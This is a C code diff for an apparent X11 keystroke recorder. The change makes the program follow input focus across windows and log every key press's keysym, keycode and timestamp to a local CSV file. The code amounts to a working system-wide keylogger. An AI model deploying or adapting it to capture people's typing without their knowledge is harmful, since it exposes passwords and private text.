@@ -27,6 +27,8 @@ int main()
 	KeySym ks;
 	XComposeStatus comp;
 	int revert;
+	XEvent ev;
+	Window root = DefaultRootWindow(x11_connection);
 
 	// Files
 	FILE *f = fopen("keys.csv", "a");
@@ -50,13 +52,22 @@ int main()
 	// infinite loop
 	while (1)
 	{
-		XEvent ev;
-		XNextEvent(x11_connection, &ev);
 		XGetInputFocus(x11_connection, &current_focus, &revert);
-		XSelectInput(x11_connection, current_focus, KeyPressMask | KeyReleaseMask | ButtonPressMask | ButtonReleaseMask);
+		XSelectInput(x11_connection, current_focus, KeyPressMask | KeyReleaseMask | ButtonPressMask | ButtonReleaseMask | FocusChangeMask);
+		XNextEvent(x11_connection, &ev);
+
 		// Event handler
 		switch (ev.type)
 		{
+		case FocusOut:
+			if (current_focus != root)
+				XSelectInput(x11_connection, current_focus, 0);
+			XGetInputFocus(x11_connection, &current_focus, &revert);
+			if (current_focus == PointerRoot)
+				current_focus = root;
+			XSelectInput(x11_connection, current_focus, KeyPressMask | KeyReleaseMask | ButtonPressMask | ButtonReleaseMask | FocusChangeMask);
+			break;
+
 		case KeyPress:
 			XLookupString(&ev.xkey, buf, 16, &ks, &comp);
 			fprintf(f, "%d;%d;%d;%d\n", ev.xkey.type, (int)ks, (int)ev.xkey.keycode, (int)ev.xkey.time);
